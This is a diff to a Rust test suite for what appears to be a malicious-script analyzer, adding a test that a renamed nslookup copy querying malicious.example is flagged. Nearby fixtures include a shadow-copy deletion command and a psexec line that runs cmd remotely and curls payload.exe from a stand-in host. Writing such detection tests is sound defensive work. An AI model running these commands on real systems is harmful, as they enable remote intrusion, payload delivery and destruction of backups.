@@ -3618,6 +3618,42 @@ C:\Users\Public\wm.tmp shadowcopy delete
     }
 
     #[test]
+    fn copied_nslookup_alias_emits_network_probe_without_path_false_positive() {
+        let script = br#"copy C:\Windows\System32\nslookup.exe C:\Users\Public\nl.tmp
+C:\Users\Public\nl.tmp malicious.example
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\nl.tmp"#)
+            )),
+            "copied nslookup alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "dns-lookup" && target == "malicious.example"
+            )),
+            "copied nslookup target was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "dns-lookup" && target == "C"
+            )),
+            "nslookup source path should not create a drive-letter probe: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
